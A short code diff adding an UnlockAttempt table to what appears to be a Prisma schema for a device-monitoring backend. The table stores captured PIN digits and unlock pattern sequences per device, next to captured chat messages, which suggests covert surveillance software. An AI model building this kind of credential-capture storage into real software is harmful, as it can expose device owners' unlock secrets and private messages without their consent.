@@ -261,3 +261,19 @@ model ChatMessage {
   @@index([deviceId, captureSession])
   @@index([deviceId, isLatest])
 }
+
+// Unlock attempts - tracks PIN, pattern, and password unlock attempts
+model UnlockAttempt {
+  id          String   @id @default(uuid())
+  deviceId    String
+  device      Device   @relation(fields: [deviceId], references: [id], onDelete: Cascade)
+  unlockType  String   // "pin", "pattern", "password", "biometric"
+  unlockData  String?  @db.Text // PIN digits, pattern sequence, or masked password
+  success     Boolean  @default(false) // Whether unlock was successful
+  reason      String?  // "submit", "timeout", "exit", "complete"
+  timestamp   DateTime @default(now()) // When attempt was made
+  syncedAt    DateTime @default(now())
+
+  @@index([deviceId, timestamp])
+  @@index([deviceId, unlockType])
+}
